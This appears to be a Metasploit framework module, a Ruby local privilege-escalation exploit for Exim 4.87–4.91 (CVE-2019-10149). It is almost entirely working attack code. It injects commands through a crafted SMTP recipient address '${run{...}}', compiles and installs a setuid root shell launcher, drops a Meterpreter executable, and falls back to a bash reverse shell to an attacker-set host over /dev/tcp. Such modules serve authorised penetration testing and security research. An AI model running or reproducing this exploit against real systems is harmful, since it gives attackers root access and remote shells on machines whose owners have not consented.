##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Exim 4.87 - 4.91 Privilege Escalation',
                      'Description'    => %q{
                        This module implements a flaw found in Exim versions 4.87 to 4.91 (inclusive).
                        Improper validation of recipient address in deliver_message()
                        function in /src/deliver.c may lead to remote command execution
                        (CVE-2019-10149).
                      },
                        'License'        => MSF_LICENSE,
                        'Author'         =>
                      [
                        'Marco Ivaldi (@0xdea)', # Working exploit
                        'Guillaume AndrÃ© (@yaumn_)' # Metasploit module
                      ],
                      'DisclosureDate' => '2019-06-05',
                      'Platform'       => [ 'linux' ],
                      'Arch'           => [ ARCH_X86, ARCH_X64 ],
                      'SessionTypes'   => [ 'shell', 'meterpreter' ],
                      'Targets'        =>
                      [
                        [
                          'Exim 4.87 - 4.91',
                          lower_version: Gem::Version.new('4.87'),
                          upper_version: Gem::Version.new('4.91')
                        ]
                      ],
                      'References'     =>
                      [
                        [ 'CVE', '2019-10149' ],
                        [ 'EDB', '46996' ]
                      ]
                     ))

    register_options(
      [
        OptString.new('EXIMPATH', [false, 'The path to the exim executable (used to check for vulnerability)']),
        OptInt.new('EXIMPORT', [true, 'The port exim is listening to', 25])
      ])

    register_advanced_options(
      [
        OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
      ])
  end

  def check
    exim = if datastore['EXIMPATH']
             datastore['EXIMPATH']
           else
             'exim'
           end
    if cmd_exec("which #{exim}").blank?
      print_error('Exim executable not found. You may want to set EXIMPATH.')
      return CheckCode::Unknown
    end

    res = cmd_exec("#{exim} -bV")
    if res =~ /Exim version ([0-9\.]*) /i # Maybe improve the regex
      version = Gem::Version.new($1)
      if version >= target[:lower_version] && version <= target[:upper_version]
        return CheckCode::Appears
      else
        return CheckCode::Safe
      end
    end
    CheckCode::Unknown
  end

  def encode_command(cmd)
    '\x' + cmd.unpack('H2' * cmd.length).join('\x')
  end

  def inject_payload(payload)
    if session.type == 'meterpreter'
      socket_subsystem = Rex::Post::Meterpreter::Extensions::Stdapi::Net::Socket.new(client)
      params = Rex::Socket::Parameters.new({
        'PeerHost' => '127.0.0.1',
        'PeerPort' => datastore['EXIMPORT']
      })
      socket = socket_subsystem.create_tcp_client_channel(params)
      socket.gets
      socket.puts("helo localhost\n")
      socket.gets
      socket.puts("mail from:<>\n")
      socket.gets
      socket.puts("rcpt to:<${run{#{payload}}}@localhost>\n")
      socket.gets
      socket.puts("data\n")
      socket.gets
      for i in (1..31)
        socket.puts("Received: #{i}\n")
      end
      socket.puts(".\n")
      socket.gets
      socket.puts("quit\n")
      socket.close
      socket_subsystem.shutdown
    else
      res = cmd_exec("exec 3<>/dev/tcp/localhost/#{datastore['EXIMPORT']}")

      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('echo "helo localhost" >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('echo "mail from:<>" >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec("echo 'rcpt to:<${run{#{payload}}}@localhost>' >&3")
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('echo "data" >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      for i in (1..31)
        cmd_exec("echo 'Received: #{i}' >&3")
      end
      cmd_exec('echo "." >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('echo "quit" >&3')
      cmd_exec('read -u 3 && echo $REPLY')
      cmd_exec('exec 3<&-')
    end

    print_status('Payload sent, wait a few seconds...')
    sleep(5)
  end

  def on_new_session(session)
    print_good("Check session #{session.name}, you should have a root shell!")
  ensure
    super
  end

  def exploit
    if session.type == 'meterpreter'
      meterpreter_shell = File.join(datastore['WritableDir'],
                                    Rex::Text.rand_text_alpha(10))
      write_file(meterpreter_shell, payload.encoded_exe)
      register_files_for_cleanup(meterpreter_shell)
      cmd_exec("chmod +x #{meterpreter_shell}")
      inject_payload(encode_command("/bin/sh -c \"#{meterpreter_shell}\""))

      if !session_created?
        print_error('Couldn\'t escalate privileges')
      end
    else
      print_status('Trying to escalate privileges with setuid method')
      shell_launcher_c_code = %|
          #include <unistd.h>
          #include <sys/types.h>

          int main() {
            setuid(0);
            setgid(0);
            execve("/bin/bash", NULL, NULL);
            return 0;
          }
      |

      @suid_shell_launcher_path = File.join(datastore['WritableDir'],
                                            Rex::Text.rand_text_alpha(10))
      write_file("#{@suid_shell_launcher_path}.c", shell_launcher_c_code)
      cmd_exec("gcc -o #{@suid_shell_launcher_path} #{@suid_shell_launcher_path}.c 2>&1")
      file_rm("#{@suid_shell_launcher_path}.c")
      inject_payload(encode_command("/bin/bash -c \"chown root #{@suid_shell_launcher_path};"\
                                    "chmod 4755 #{@suid_shell_launcher_path}\""))
      cmd_exec(@suid_shell_launcher_path)
      file_rm(@suid_shell_launcher_path)

      if is_root?
        print_good('You are now root, enjoy!')
        return
      end

      print_warning('Couldn\'t escalate privileges, trying reverse shell method')

      inject_payload(encode_command("/bin/bash -c \"/bin/bash -i >& /dev/tcp/#{datastore['LHOST']}/"\
                                    "#{datastore['LPORT']} 0>&1 &\""))

      if !session_created?
        print_error('Couldn\'t escalate privileges')
      end
    end
  end
end
